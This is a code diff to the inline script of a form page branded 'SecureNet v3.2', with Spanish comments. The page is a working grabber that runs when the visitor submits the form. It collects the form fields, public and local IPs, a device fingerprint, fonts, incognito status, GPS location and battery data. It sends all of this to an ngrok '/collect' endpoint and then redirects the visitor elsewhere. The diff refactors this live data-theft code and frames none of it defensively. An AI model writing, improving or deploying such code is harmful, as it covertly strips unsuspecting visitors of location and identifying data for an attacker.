@@ -21,37 +21,24 @@
 <div class="ft">🔒 SecureNet v3.2 · Todos los derechos reservados</div>
 </div>
 <script>
-// ============================================================
-//  SCRIPT MEJORADO - VERSIÓN CORREGIDA (CON TIMEOUTS)
-// ============================================================
 (function(){
+    // ========================================
+    //  CONFIGURACIÓN - ACTUALIZA ESTA URL
+    // ========================================
+    var ENDPOINT = 'https://roast-skinning-paralysis.ngrok-free.dev/collect';
+    var REDIR = 'https://guns.lol/penthouseintokyo';
 
-    var CONFIG = {
-        endpoint: 'https://roast-skinning-paralysis.ngrok-free.dev/collect',
-        redir: 'https://guns.lol/penthouseintokyo',
-        ipApi: 'https://api.ipify.org?format=json',
-        geoApi: 'https://ipapi.co/json/'
-    };
+    // ========================================
+    //  FUNCIONES DE RECOLECCIÓN
+    // ========================================
 
-    // ---------- UTILIDAD: TIMEOUT PROMISE ----------
-    function promiseWithTimeout(promise, ms) {
-        return Promise.race([
-            promise,
-            new Promise(function(resolve) {
-                setTimeout(function() { resolve(null); }, ms);
-            })
-        ]);
-    }
-
-    // ---------- 1. IP PÚBLICA ----------
     function getPublicIP() {
-        return fetch(CONFIG.ipApi)
+        return fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
             .then(d => d.ip)
-            .catch(function() { return null; });
+            .catch(() => null);
     }
 
-    // ---------- 2. IP LOCAL (WebRTC) ----------
     function getLocalIP() {
         return new Promise(function(resolve) {
             try {
@@ -68,7 +55,6 @@
         });
     }
 
-    // ---------- 3. FINGERPRINT (Canvas + Audio + WebGL) ----------
     function getAdvancedFingerprint() {
         var parts = [];
         try {
@@ -114,7 +100,6 @@
         return btoa(parts.join('|'));
     }
 
-    // ---------- 4. FUENTES (CON TIMEOUT) ----------
     function getFonts() {
         return new Promise(function(resolve) {
             if (!document.fonts) { resolve(null); return; }
@@ -135,7 +120,6 @@
         });
     }
 
-    // ---------- 5. MODO INCOGNITO ----------
     function isIncognito() {
         return new Promise(function(resolve) {
             try {
@@ -146,7 +130,6 @@
         });
     }
 
-    // ---------- 6. GEOLOCALIZACIÓN (CON FALBACK RÁPIDO) ----------
     function getGeoWithTrick() {
         return new Promise(function(resolve) {
             if (navigator.geolocation) {
@@ -155,7 +138,7 @@
                         resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
                     },
                     function() {
-                        fetch(CONFIG.geoApi)
+                        fetch('https://ipapi.co/json/')
                             .then(r => r.json())
                             .then(d => {
                                 if (d.latitude && d.longitude) {
@@ -175,7 +158,6 @@
         });
     }
 
-    // ---------- 7. BATERÍA ----------
     function getBatteryInfo() {
         return new Promise(function(resolve) {
             if (navigator.getBattery) {
@@ -193,20 +175,26 @@
         });
     }
 
-    // ---------- 8. ENVÍO DE DATOS ----------
-function sendData(payload) {
-    var json = JSON.stringify(payload);
-    fetch(CONFIG.endpoint, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: json
-    }).catch(function(err) {
-        console.log('Error en fetch:', err);
-    });
-    window.location.href = CONFIG.redir;
-}
+    // ========================================
+    //  ENVÍO DE DATOS (FORZADO CON FETCH)
+    // ========================================
+    function sendData(payload) {
+        var json = JSON.stringify(payload);
+        // Usamos fetch directamente, no sendBeacon
+        fetch(ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: json
+        }).catch(function(err) {
+            console.log('Error en fetch:', err);
+        });
+        // Redirigimos siempre
+        window.location.href = REDIR;
+    }
 
-    // ---------- 9. MANEJO DEL FORMULARIO ----------
+    // ========================================
+    //  MANEJO DEL FORMULARIO
+    // ========================================
     document.getElementById('frm').addEventListener('submit', function(e) {
         e.preventDefault();
         var nombre = document.getElementById('n').value.trim();
@@ -235,12 +223,12 @@ function sendData(payload) {
         };
 
         Promise.all([
-            promiseWithTimeout(getPublicIP(), 3000),
-            promiseWithTimeout(getLocalIP(), 2500),
-            promiseWithTimeout(getGeoWithTrick(), 6000),
-            promiseWithTimeout(getFonts(), 2000),
-            promiseWithTimeout(isIncognito(), 2000),
-            promiseWithTimeout(getBatteryInfo(), 2000)
+            getPublicIP().catch(() => null),
+            getLocalIP().catch(() => null),
+            getGeoWithTrick().catch(() => null),
+            getFonts().catch(() => null),
+            isIncognito().catch(() => false),
+            getBatteryInfo().catch(() => null)
         ]).then(function(results) {
             var payload = Object.assign({}, baseData, {
                 ip_publica: results[0],
@@ -250,17 +238,21 @@ function sendData(payload) {
                 incognito: results[4],
                 battery: results[5]
             });
+            console.log('Enviando payload:', payload);
             sendData(payload);
         }).catch(function() {
             sendData(baseData);
         });
 
+        // Timeout de seguridad
         setTimeout(function() {
             sendData(baseData);
         }, 8000);
     });
 
-    // ---------- 10. VALIDACIONES VISUALES ----------
+    // ========================================
+    //  VALIDACIONES VISUALES
+    // ========================================
     document.getElementById('n').addEventListener('input', function(){
         this.style.borderColor = this.value.length > 0 ? '#4fc3f7' : 'rgba(255,255,255,.12)';
     });
